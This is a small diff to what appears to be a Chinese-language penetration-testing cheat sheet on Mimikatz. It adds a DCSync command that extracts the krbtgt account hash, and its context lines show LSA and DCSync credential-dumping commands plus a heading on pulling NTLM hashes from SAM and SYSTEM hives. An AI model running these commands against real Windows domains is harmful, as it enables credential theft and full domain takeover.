@@ -28,6 +28,8 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 # 导出特定用户的哈希
 ```
 lsadump::dcsync /domain:kevin.com /user:root
+
+lsadump::dcsync /user:za\krbtgt
 ```
 
 # 从sam.hive和system.hive文件中获得NTLM Hash
